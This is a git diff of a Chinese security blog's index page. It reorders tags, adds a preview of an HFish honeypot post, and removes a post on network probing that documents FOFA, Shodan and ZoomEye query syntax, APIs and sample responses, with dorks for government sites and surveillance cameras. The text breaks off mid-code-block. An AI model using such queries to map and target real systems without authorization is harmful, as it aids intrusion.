@@ -195,11 +195,11 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">漏洞</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">漏洞</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		
 		</ul>
@@ -403,6 +403,97 @@ var _hmt = _hmt || [];
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/08/20/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9C%80%E4%BC%98%E5%8C%96/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-HFish蜜罐搭建与测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/08/10/HFish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%B5%8B%E8%AF%95/">HFish蜜罐搭建与测试</a>
+    </h1>
+  
+
+        
+        <a href="/2022/08/10/HFish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%B5%8B%E8%AF%95/" class="archive-article-date">
+  	<time datetime="2022-08-10T04:17:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>HFish 是一种基于 Golang 开发的跨平台多功能主动诱导型开源蜜罐框架系统，为企业安全防护所做的精心打造，全程记录黑客攻击手段，实现防护自主化。</p>
+        
+          <a class="article-more-a" href="/2022/08/10/HFish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%B5%8B%E8%AF%95/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">蜜罐</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/甲方安全/" class="article-tag-list-link color5">甲方安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/08/10/HFish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%B5%8B%E8%AF%95/">展开全文 >></a>
         </p>
       
 
@@ -816,605 +907,10 @@ var _hmt = _hmt || [];
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言"></a>0×01 前言</h4><p><strong>什么是网络探测</strong><br>网络探测指对计算机网络或 DNS 服务器进行扫描，获取有效的地址、活动端口号、主机操作系统类型和安全弱点的攻击方式。</p>
-<h4 id="0×02-网络探测技术分类"><a href="#0×02-网络探测技术分类" class="headerlink" title="0×02 网络探测技术分类"></a>0×02 网络探测技术分类</h4><p>网络环境信息包括网络拓扑结构、主机、主机开放的网络服务以及存在的漏洞等，对网络环境信息的获取工具可以按照其是否对目标发起主动的探测分为两大类：<strong>主动探测与被动探测。</strong></p>
-<p>主动探测是传统的扫描方式，它是通过给目标主机发送特定的包并收集回应包来取得相关信息的，从而确定其操作系统、开启的端口以及存在的漏洞等信息(无响应本身也是信息，表明可能存在过滤设备将探测包或探测回应包过滤了)。属于此类的开源工具有 nmap 和 nessus。主动扫描的优势在于通常能较快获取信息，准确性也比较高。缺点在于一方面易于被发现，很难掩盖扫描痕迹；另一方面要成功实施主动扫描通常需要突破防火墙，但突破防火墙是很困难的。</p>
-<p>被动探测是通过监听网络包来取得信息。根据数据包中包含的指纹提取对应的一些网络环境信息，属于此类的开源工具有 p0f(被动操作系统辨识工具)和 pads(被动网络服务发现工具)。被动扫描一般只需要监听网络流量而不需要主动发送网络包，也不易受防火墙影响。该探测技术的主要优点是对它的检测几乎是不可能的。而其主要缺点在于速度较慢而且准确性较差，当目标不产生网络流量时，就无法得知目标的任何信息。</p>
-<h4 id="0×03-FOFA-网络空间探测引擎"><a href="#0×03-FOFA-网络空间探测引擎" class="headerlink" title="0×03 FOFA 网络空间探测引擎"></a>0×03 FOFA 网络空间探测引擎</h4><h5 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h5><p>FOFA 是白帽汇推出的一款网络空间资产搜索引擎。 它能够帮助企业客户迅速进行网络资产匹配、加快后续工作进程。 例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
-<h5 id="2-查询语法"><a href="#2-查询语法" class="headerlink" title="2 查询语法"></a>2 查询语法</h5><p>直接输入查询语句，将从标题，html 内容，http 头信息，url 字段中搜索</p>
-<ul>
-<li>title&#x3D;”abc” 从标题中搜索 abc。<br>例：标题中有北京的网站</li>
-<li>header&#x3D;”abc” 从 http 头中搜索 abc。<br>例：jboss 服务器</li>
-<li>body&#x3D;”abc” 从 html 正文中搜索 abc。<br>例：正文包含 Hacked by</li>
-<li>domain&#x3D;”qq.com” 搜索根域名带有 qq.com 的网站。<br>例：  根域名是 qq.com 的网站</li>
-<li>host&#x3D;”.gov.cn” 从 url 中搜索.gov.cn,注意搜索要用 host 作为名称。例：  政府网站,  教育网站</li>
-<li>port&#x3D;”443” 查找对应 443 端口的资产。<br>例：  查找对应 443 端口的资产</li>
-<li>ip&#x3D;”1.1.1.1” 从 ip 中搜索包含 1.1.1.1 的网站,注意搜索要用 ip 作为名称。<br>例：  查询 IP 为 220.181.111.1 的网站; 如果想要查询网段，可以是：ip&#x3D;”220.181.111.1&#x2F;24”，例如查询 IP 为 220.181.111.1 的 C 网段资产</li>
-<li>protocol&#x3D;”https” 搜索指定协议类型(在开启端口扫描的情况下有效)。<br>例：  查询 https 协议资产</li>
-<li>city&#x3D;”Hangzhou” 搜索指定城市的资产。<br>例：  搜索指定城市的资产</li>
-<li>region&#x3D;”Zhejiang” 搜索指定行政区的资产。<br>例：  搜索指定行政区的资产</li>
-<li>country&#x3D;”CN” 搜索指定国家(编码)的资产。<br>例：  搜索指定国家(编码)的资产</li>
-<li>cert&#x3D;”google” 搜索证书(https 或者 imaps 等)中带有 google 的资产。<br>例：  搜索证书(https 或者 imaps 等)中带有 google 的资产</li>
-<li>banner&#x3D;users &amp;&amp; protocol&#x3D;ftp 搜索 FTP 协议中带有 users 文本的资产。<br>例：  搜索 FTP 协议中带有 users 文本的资产</li>
-<li>type&#x3D;service 搜索所有协议资产，支持 subdomain 和 service 两种。例：  搜索所有协议资产</li>
-<li>os&#x3D;windows 搜索 Windows 资产。<br>例：  搜索 Windows 资产</li>
-<li>server&#x3D;&#x3D;”Microsoft-IIS&#x2F;7.5” 搜索 IIS 7.5 服务器。<br>例：  搜索 IIS 7.5 服务器</li>
-<li>app&#x3D;”海康威视-视频监控” 搜索海康威视设备，更多 app 规则。例：  搜索海康威视设备</li>
-<li>after&#x3D;”2017” &amp;&amp; before&#x3D;”2017-10-01” 时间范围段搜索。例：  时间范围段搜索，注意： after 是大于并且等于，before 是小于，这里 after&#x3D;”2017” 就是日期大于并且等于 2017-01-01 的数据，而 before&#x3D;”2017-10-01” 则是小于 2017-10-01 的数据</li>
-<li>asn&#x3D;”19551” 搜索指定 asn 的资产。<br>例：  搜索指定 asn 的资产</li>
-<li>org&#x3D;”Amazon.com, Inc.” 搜索指定 org(组织)的资产。<br>例：  搜索指定 org(组织)的资产</li>
-<li>base_protocol&#x3D;”udp” 搜索指定 udp 协议的资产。<br>例：  搜索指定 udp 协议的资产</li>
-<li>is_ipv6&#x3D;true 搜索 ipv6 的资产,只接受 true 和 false。<br>例：  搜索 ipv6 的资产</li>
-<li>is_domain&#x3D;true 搜索域名的资产,只接受 true 和 false。<br>例：  搜索域名的资产</li>
-<li>ip_ports&#x3D;”80,443” 或者 ports&#x3D;”80,443” 搜索同时开放 80 和 443 端口的 ip 资产(以 ip 为单位的资产数据)。<br>例：  搜索同时开放 80 和 443 端口的 ip</li>
-<li>ip_ports&#x3D;&#x3D;”80,443” 或者 ports&#x3D;&#x3D;”80,443” 搜索同时开放 80 和 443 端口的 ip 资产(以 ip 为单位的资产数据)。<br>例：  搜索只开放 80 和 443 端口的 ip</li>
-<li>ip_country&#x3D;”CN” 搜索中国的 ip 资产(以 ip 为单位的资产数据)。例：  搜索中国的 ip 资产</li>
-<li>ip_region&#x3D;”Zhejiang” 搜索指定行政区的 ip 资产(以 ip 为单位的资产数据)。<br>例：  搜索指定行政区的资产</li>
-<li>ip_city&#x3D;”Hangzhou” 搜索指定城市的 ip 资产(以 ip 为单位的资产数据)。<br>例：  搜索指定城市的资产</li>
-<li>ip_after&#x3D;”2019-01-01” 搜索 2019-01-01 以后的 ip 资产(以 ip 为单位的资产数据)。<br>例：  搜索 2019-01-01 以后的 ip 资产</li>
-<li>ip_before&#x3D;”2019-01-01” 搜索 2019-01-01 以前的 ip 资产(以 ip 为单位的资产数据)。<br>例：  搜索 2019-01-01 以前的 ip 资产</li>
-</ul>
-<p><strong>高级搜索</strong>：<br>可以使用括号 和 &amp;&amp; || !&#x3D;等符号，如<br>title&#x3D;”powered by” &amp;&amp; title!&#x3D;discuz<br>title!&#x3D;”powered by” &amp;&amp; body&#x3D;discuz<br>( body&#x3D;”content&#x3D;”WordPress” || (header&#x3D;”X-Pingback” &amp;&amp; header&#x3D;”&#x2F;xmlrpc.php” &amp;&amp; body&#x3D;”&#x2F;wp-includes&#x2F;“) ) &amp;&amp; host&#x3D;”gov.cn”<br>新增完全匹配的符号，可以加快搜索速度，<br>比如查找 qq.com 所有 host，可以是 domain”qq.com”</p>
-<h5 id="3-API-调用"><a href="#3-API-调用" class="headerlink" title="3 API 调用"></a>3 API 调用</h5><blockquote>
-<p><a target="_blank" rel="noopener" href="https://fofa.so/api/v1/search/all?email=%7Buser%7D&key=%7Btoken%7D&qbase64=%7Bdork%7D&fields=%7Bresource%7D&page=%7Bpage%7D">https://fofa.so/api/v1/search/all?email={user}&key={token}&qbase64={dork}&fields={resource}&page={page}</a></p>
-</blockquote>
-<h6 id="查询接口"><a href="#查询接口" class="headerlink" title="查询接口"></a>查询接口</h6><p>输入下列请求所需的 qbase64，返回 json 数据格式</p>
-<table>
-<thead>
-<tr>
-<th>字段名</th>
-<th>类型</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>qbase64</td>
-<td>string</td>
-<td>经过 base64 编码后的查询语法，支持 domain,host,ip,header,body,title，运算符支持&#x3D;&#x3D; &#x3D; !&#x3D; &#x3D;~</td>
-</tr>
-<tr>
-<td>page</td>
-<td>integer</td>
-<td>每页返回记录数，普通用户默认为 10000 条，vip 用户默认为 100 条，最大可设置为 10000 条</td>
-</tr>
-<tr>
-<td>size</td>
-<td>integer</td>
-<td>每页返回记录数，普通用户默认为 10000 条，vip 用户默认为 100 条，最大可设置为 10000 条</td>
-</tr>
-<tr>
-<td>fields</td>
-<td>string</td>
-<td>【可选参数】字段列表，默认为 host，用逗号分隔多个参数，如(fields&#x3D;ip,title)，可选的列表有：host title ip domain port country province city country_name header server protocol banner cert isp as_number as_organization latitude longitude lastupdatetime 注意：country 是国家代码，例如 CN, country_name 是国家名称</td>
-</tr>
-<tr>
-<td>full</td>
-<td>boolean</td>
-<td>默认为 false，是否搜索全部数据，默认和页面搜索一样,只能搜索一年内的数据，指定为 true 搜索全部数据</td>
-</tr>
-</tbody></table>
-<h6 id="接口返回"><a href="#接口返回" class="headerlink" title="接口返回"></a>接口返回</h6><table>
-<thead>
-<tr>
-<th>字段名</th>
-<th>类型</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>mode</td>
-<td>string</td>
-<td>查询模式：mode 返回为”normal”代表普通查询(q&#x3D;words)，mode 返回为”extended”代表高级查询(如 q&#x3D;domain&#x3D;fofa.so,q&#x3D;title&#x3D;fofa,采用高级条件搜索)</td>
-</tr>
-<tr>
-<td>page</td>
-<td>integer</td>
-<td>当前请求页的页数</td>
-</tr>
-<tr>
-<td>size</td>
-<td>integer</td>
-<td>请求返回结果的个数</td>
-</tr>
-<tr>
-<td>results</td>
-<td>array</td>
-<td>请求返回结果的详情数组</td>
-</tr>
-</tbody></table>
-<p><strong>返回示例</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 正确返回结果</span><br><span class="line">&#123;</span><br><span class="line">    &quot;mode&quot;: &quot;extended&quot;,</span><br><span class="line">    &quot;error&quot;: null,</span><br><span class="line">    &quot;query&quot;: &quot;domain=\&quot;nosec.org\&quot;\n&quot;,</span><br><span class="line">    &quot;page&quot;: 1,</span><br><span class="line">    &quot;size&quot;: 6,</span><br><span class="line">    &quot;results&quot;:</span><br><span class="line">    [</span><br><span class="line">        [ &quot;https://i.nosec.org&quot; ],</span><br><span class="line">        [ &quot;https://nosec.org&quot; ],</span><br><span class="line">        [ &quot;down3.nosec.org&quot; ],</span><br><span class="line">        [ &quot;www.nosec.org&quot; ],</span><br><span class="line">        [ &quot;nosec.org&quot; ],</span><br><span class="line">        [ &quot;cdn.nosec.org&quot; ]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#错误返回</span><br><span class="line">&#123;</span><br><span class="line">    &quot;error&quot;: true,</span><br><span class="line">    &quot;errmsg&quot;: &quot;401 Unauthorized, make sure email and apikey is correct.&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="4-代码实现"><a href="#4-代码实现" class="headerlink" title="4 代码实现"></a>4 代码实现</h5><p><img src="http://qiniu.austfish.cn/yuque/FvbEceB3Mcq9Uw2thqEM4-dqr2Ec.png"></p>
-<p><img src="http://qiniu.austfish.cn/yuque/Ft0kvsqOqqPaacqAmU72Y90Vg47d.png"></p>
-<h4 id="0×04-SHODAN-搜索引擎"><a href="#0×04-SHODAN-搜索引擎" class="headerlink" title="0×04 SHODAN 搜索引擎"></a>0×04 SHODAN 搜索引擎</h4><h5 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1 概述"></a>1 概述</h5><p>Shodan 是一个搜索互联网连接设备的搜索引擎，不同于谷歌、必应、百度这些搜索引擎。用户可以在 Shodan 上使用 Shodan 搜索语法查找连接到互联网的摄像头、路由器、服务器等设备信息。在渗透测试中，是个很不错的神器。</p>
-<h5 id="2-查询语法-1"><a href="#2-查询语法-1" class="headerlink" title="2 查询语法"></a>2 查询语法</h5><table>
-<thead>
-<tr>
-<th>字段</th>
-<th>解释</th>
-<th>例子</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>hostname</td>
-<td>搜索指定的主机或域名</td>
-<td>hostname:”sina.com”</td>
-</tr>
-<tr>
-<td>port</td>
-<td>搜索指定的端口</td>
-<td>port:”80”</td>
-</tr>
-<tr>
-<td>country</td>
-<td>搜索指定的国家</td>
-<td>country:”China”</td>
-</tr>
-<tr>
-<td>city</td>
-<td>搜索指定的城市</td>
-<td>city:”Beijing”</td>
-</tr>
-<tr>
-<td>product</td>
-<td>搜索指定的操作系统&#x2F;软件</td>
-<td>product:”apache”</td>
-</tr>
-<tr>
-<td>version</td>
-<td>搜索指定的软件版本</td>
-<td>version:”7.1.4”</td>
-</tr>
-<tr>
-<td>net</td>
-<td>搜索指定的 IP 地址或子网</td>
-<td>net:”117.44.67.0&#x2F;24”</td>
-</tr>
-</tbody></table>
-<h5 id="3-API-调用-1"><a href="#3-API-调用-1" class="headerlink" title="3 API 调用"></a>3 API 调用</h5><blockquote>
-<p>HTTPS ：<a target="_blank" rel="noopener" href="//api.shodan.io/shodan/host/search?key=%7BYOUR_API_KEY%7D&query=%7Bquery%7D&facets=%7Bfacets%7D">&#x2F;&#x2F;api.shodan.io&#x2F;shodan&#x2F;host&#x2F;search?key&#x3D;{YOUR_API_KEY}&amp;query&#x3D;{query}&amp;facets&#x3D;{facets}</a></p>
-</blockquote>
-<p><strong>key</strong></p>
-<p>注册账号，获得 API Key</p>
-<p><strong>query</strong></p>
-<p>Shodan 搜索查询。<br>所提供的字符串用于搜索 Shodan 中的标语数据库，并带有附加选项以使用“ filter：value”格式在搜索查询中提供过滤器。<br>例如，以下搜索查询将找到位于德国的 Apache Web 服务器：”apache country：DE”。<br>当前支持以下过滤器：</p>
-<p><img src="http://qiniu.austfish.cn/yuque/FmM01e6NnmmxgEMab0FUcKcFoLm3.png"><br><img src="http://qiniu.austfish.cn/yuque/FmNk2-p9WdZhgXdPmq3liXsGvIq5.png"><br><img src="http://qiniu.austfish.cn/yuque/FgQytKTceEjJXNYHNnWyhtrfrqGM.png"></p>
-<p><strong>facets</strong></p>
-<p>用逗号分隔的属性列表，以获取摘要信息。属性名称也可以采用”property：count”的格式，其中”count”是将为属性返回的构面数（即”country：100”将获得搜索查询的前 100 个国家&#x2F;地区）。当前支持以下方面：<br><img src="http://qiniu.austfish.cn/yuque/Fmk2cd6E9QQbobX4d4ntu1-cPeuB.png"><br><img src="http://qiniu.austfish.cn/yuque/FkFTqKhpzn4CXMy3FnzZ7NyK0N4k.png"><br><img src="http://qiniu.austfish.cn/yuque/FtOVKzYvpHunGfk_4m-KFe8u1Psm.png"></p>
-<p><strong>返回例子</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;matches&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">   &quot;os&quot;: null,</span><br><span class="line">   &quot;timestamp&quot;: &quot;2014-01-15T05:49:56.283713&quot;,</span><br><span class="line">   &quot;isp&quot;: &quot;Vivacom&quot;,</span><br><span class="line">   &quot;asn&quot;: &quot;AS8866&quot;,</span><br><span class="line">   &quot;hostnames&quot;: [ ],</span><br><span class="line">   &quot;location&quot;: &#123;</span><br><span class="line">    &quot;city&quot;: null,</span><br><span class="line">    &quot;region_code&quot;: null,</span><br><span class="line">    &quot;area_code&quot;: null,</span><br><span class="line">    &quot;longitude&quot;: 25,</span><br><span class="line">    &quot;country_code3&quot;: &quot;BGR&quot;,</span><br><span class="line">    &quot;country_name&quot;: &quot;Bulgaria&quot;,</span><br><span class="line">    &quot;postal_code&quot;: null,</span><br><span class="line">    &quot;dma_code&quot;: null,</span><br><span class="line">    &quot;country_code&quot;: &quot;BG&quot;,</span><br><span class="line">    &quot;latitude&quot;: 43</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;ip&quot;: 3579573318,</span><br><span class="line">   &quot;domains&quot;: [ ],</span><br><span class="line">   &quot;org&quot;: &quot;Vivacom&quot;,</span><br><span class="line">   &quot;data&quot;: &quot;@PJL INFO STATUS CODE=35078 DISPLAY=&quot;Power Saver&quot; ONLINE=TRUE &quot;,</span><br><span class="line">   &quot;port&quot;: 9100,</span><br><span class="line">   &quot;ip_str&quot;: &quot;213.91.244.70&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line"> ],</span><br><span class="line"> &quot;facets&quot;: &#123;</span><br><span class="line">  &quot;org&quot;: [</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 286,</span><br><span class="line">    &quot;value&quot;: &quot;Korea Telecom&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 229,</span><br><span class="line">    &quot;value&quot;: &quot;Comcast Cable&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 113,</span><br><span class="line">    &quot;value&quot;: &quot;Taiwan Academic Network&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 107,</span><br><span class="line">    &quot;value&quot;: &quot;University of Minnesota&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 104,</span><br><span class="line">    &quot;value&quot;: &quot;Tiawan Academic Network (TANet) Information Center&quot;</span><br><span class="line">   &#125;</span><br><span class="line">  ]</span><br><span class="line"> &#125;,</span><br><span class="line"> &quot;total&quot;: 12039&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="4-代码调用"><a href="#4-代码调用" class="headerlink" title="4 代码调用"></a>4 代码调用</h5><p><strong>常用 Shodan 库函数</strong></p>
-<ul>
-<li>shodan.Shodan(key) ：初始化连接 API</li>
-<li>Shodan.count(query, facets&#x3D;None)：返回查询结果数量</li>
-<li>Shodan.host(ip, history&#x3D;False)：返回一个 IP 的详细信息</li>
-<li>Shodan.ports()：返回 Shodan 可查询的端口号</li>
-<li>Shodan.protocols()：返回 Shodan 可查询的协议</li>
-<li>Shodan.services()：返回 Shodan 可查询的服务</li>
-<li>Shodan.queries(page&#x3D;1, sort&#x3D;’timestamp’, order&#x3D;’desc’)：查询其他用户分享的查询规则</li>
-<li>Shodan.scan(ips, force&#x3D;False)：使用 Shodan 进行扫描，ips 可以为字符或字典类型</li>
-<li>Shodan.search(query, page&#x3D;1, limit&#x3D;None, offset&#x3D;None, ufacets&#x3D;None, minify&#x3D;True)：查询 Shodan 数据</li>
-</ul>
-<h4 id="0×04-ZOOMEYE-搜索引擎"><a href="#0×04-ZOOMEYE-搜索引擎" class="headerlink" title="0×04 ZOOMEYE 搜索引擎"></a>0×04 ZOOMEYE 搜索引擎</h4><h5 id="1-概述-2"><a href="#1-概述-2" class="headerlink" title="1 概述"></a>1 概述</h5><p>ZoomEye 平台为广大网络研究爱好者和极客们提供了强大的 Restful API，通过它能够更好的与平台相连接，使用 ZoomEye 平台提供的资源, 构建有意思的应用。 所以尽情发挥你的想象力吧，精彩的网络空间，等待你去探索。</p>
-<h5 id="2-查询语法-2"><a href="#2-查询语法-2" class="headerlink" title="2 查询语法"></a>2 查询语法</h5><blockquote>
-<p><a target="_blank" rel="noopener" href="https://api.zoomeye.org/%7B%7D/search?query=%7B%7D&page=%7B%7D&facet=%7B%7D">https://api.zoomeye.org/{}/search?query={}&page={}&facet={}</a>“</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>类型</th>
-<th>说明</th>
-<th>是否必须</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>query</td>
-<td>string</td>
-<td>查询关键词</td>
-<td>必须</td>
-<td>port:80 nginx</td>
-</tr>
-<tr>
-<td>page</td>
-<td>integer</td>
-<td>翻页参数（默认为 1）</td>
-<td>可选</td>
-<td>7</td>
-</tr>
-<tr>
-<td>facets</td>
-<td>string</td>
-<td>统计项目。如果为多个，使用逗号分隔各个统计项</td>
-<td>可选</td>
-<td>app,device</td>
-</tr>
-</tbody></table>
-<h5 id="3-API-调用-2"><a href="#3-API-调用-2" class="headerlink" title="3 API 调用"></a>3 API 调用</h5><p><strong>主机设备搜索过滤器</strong></p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>类型</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>app</td>
-<td>string</td>
-<td>应用，产品</td>
-<td>app: ProFTD</td>
-</tr>
-<tr>
-<td>ver</td>
-<td>string</td>
-<td>版本</td>
-<td>ver:2.1</td>
-</tr>
-<tr>
-<td>device</td>
-<td>string</td>
-<td>设备类型</td>
-<td>device:router</td>
-</tr>
-<tr>
-<td>os</td>
-<td>string</td>
-<td>操作系统</td>
-<td>os:windows</td>
-</tr>
-<tr>
-<td>service</td>
-<td>string</td>
-<td>服务类型</td>
-<td>service:http</td>
-</tr>
-<tr>
-<td>ip</td>
-<td>string</td>
-<td>IP 地址</td>
-<td>ip:192.168.1.1</td>
-</tr>
-<tr>
-<td>cidr</td>
-<td>string</td>
-<td>CIDR 格式地址</td>
-<td>cidr:192.168.1.1&#x2F;24</td>
-</tr>
-<tr>
-<td>hostname</td>
-<td>string</td>
-<td>主机名称</td>
-<td>hostname:google.com</td>
-</tr>
-<tr>
-<td>port</td>
-<td>string</td>
-<td>端口号</td>
-<td>port:80</td>
-</tr>
-<tr>
-<td>city</td>
-<td>string</td>
-<td>城市名称</td>
-<td>city:beijing</td>
-</tr>
-<tr>
-<td>country</td>
-<td>string</td>
-<td>国家名称</td>
-<td>country:china</td>
-</tr>
-<tr>
-<td>asn</td>
-<td>string</td>
-<td>ASN 号码</td>
-<td>asn:8978</td>
-</tr>
-</tbody></table>
-<p><strong>Web 应用搜索过滤器</strong></p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>类型</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>app</td>
-<td>string</td>
-<td>Web 应用信息</td>
-<td>webapp:wordpres</td>
-</tr>
-<tr>
-<td>header</td>
-<td>string</td>
-<td>HTTP headers</td>
-<td>header:server</td>
-</tr>
-<tr>
-<td>keywords</td>
-<td>string</td>
-<td>meta 属性关键词</td>
-<td>keywords:baidu.com</td>
-</tr>
-<tr>
-<td>desc</td>
-<td>string</td>
-<td>HTTP description 属性</td>
-<td>desc:hello</td>
-</tr>
-<tr>
-<td>title</td>
-<td>string</td>
-<td>HTTP Title 标题信息</td>
-<td>title: baidu</td>
-</tr>
-<tr>
-<td>ip</td>
-<td>string</td>
-<td>IP 地址</td>
-<td>ip:192.168.1.1</td>
-</tr>
-<tr>
-<td>site</td>
-<td>string</td>
-<td>site 搜索</td>
-<td>site:baidu.com</td>
-</tr>
-<tr>
-<td>city</td>
-<td>string</td>
-<td>城市名称</td>
-<td>city:beijing</td>
-</tr>
-<tr>
-<td>country</td>
-<td>string</td>
-<td>国家名称</td>
-<td>country:china</td>
-</tr>
-</tbody></table>
-<p><strong>返回值</strong></p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>matches</td>
-<td>string</td>
-<td>结果集</td>
-</tr>
-<tr>
-<td>facets</td>
-<td>string</td>
-<td>统计结果</td>
-</tr>
-<tr>
-<td>total</td>
-<td>string</td>
-<td>结果总数</td>
-</tr>
-</tbody></table>
-<p><strong>响应示例</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 